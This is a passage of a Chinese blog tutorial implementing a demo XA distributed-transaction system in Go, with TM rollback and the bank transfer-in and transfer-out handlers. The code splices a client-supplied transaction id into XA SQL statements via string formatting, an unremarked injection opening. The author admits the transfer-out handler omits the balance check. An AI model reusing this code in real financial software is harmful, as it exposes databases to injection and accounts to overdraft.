&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WrappedPost&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">cli&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CallbackUrl&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">callbackPayload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">callbackResp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">callbackResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RollbackGlobalTxResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;rollback local tx failed, response code %d, %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">callbackResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">callbackResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Message&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{}{&lt;/span>
&lt;span class="s">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;message&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;ok&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>回滚的逻辑和提交是一样的，不多做解释了。&lt;/p>
&lt;h2 id="6-bank-实现">#6 Bank 实现&lt;/h2>
&lt;h3 id="转入">转入&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">transIn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">gin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TransInReq&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindJSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">db&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;db&amp;#34;&lt;/span>&lt;span class="p">).(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">sqlx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DB&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">cli&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewTMClient&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://tm:5000&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">branchID&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGenBranchID&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;TransIn&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">cli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RegisterLocalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RegisterLocalTxReq&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">BranchID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">branchID&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">CallbackUrl&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://bank%d:5000/v1alpha1/tm_callback&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">flgBankID&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TransInResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;register local tx failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 业务逻辑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 准备 XA 事务
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">xid&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">branchID&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;XA BEGIN %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">xid&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="s">&amp;#34;UPDATE wallet SET balance=balance+? WHERE id=?&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Amount&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ID&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;XA END %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">xid&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;XA PREPARE %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">xid&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{}{&lt;/span>
&lt;span class="s">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;message&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;ok&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果把MySQL视作RM的话，Bank服务就是连通TM和AP的桥梁。放到转账的场景里，假设AP是支付宝，那能指望支付宝去直接访问银行的数据库吗？比如支付宝从基金里提款，调用基金的提款接口和银行的转账，也是个类似的场景。当然具体业务不能直接套XA，就是举个例子。&lt;/p>
&lt;p>转入的接口本身就是代理了一下 MySQL 的 &lt;code>update&lt;/code> 语句，实际业务场景里可能还会有更多业务逻辑上的判断。&lt;/p>
&lt;h3 id="转出">转出&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">transOut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">gin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TransOutReq&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindJSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">db&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;db&amp;#34;&lt;/span>&lt;span class="p">).(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">sqlx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DB&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">cli&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewTMClient&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://tm:5000&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">branchID&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGenBranchID&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;TransOut&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// 注册本地事务
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">cli&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RegisterLocalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RegisterLocalTxReq&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">BranchID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">branchID&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">CallbackUrl&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://bank%d:5000/v1alpha1/tm_callback&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">flgBankID&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TransInResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;register local tx failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 业务逻辑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 准备 XA 事务
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">xid&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">branchID&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;XA BEGIN %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">xid&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="s">&amp;#34;UPDATE wallet SET balance=balance-? WHERE id=?&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Amount&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ID&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;XA END %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">xid&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;XA PREPARE %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">xid&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{}{&lt;/span>
&lt;span class="s">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;message&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;ok&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>转出的代码其实有点问题，漏掉了检查余额，其他和转入的接口就没什么区别了。&lt;/p>
&lt;h2 id="7-ap-实现">#7 AP 实现&lt;/h2>
&lt;h3 id="转账">转账&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">transfer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">gin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
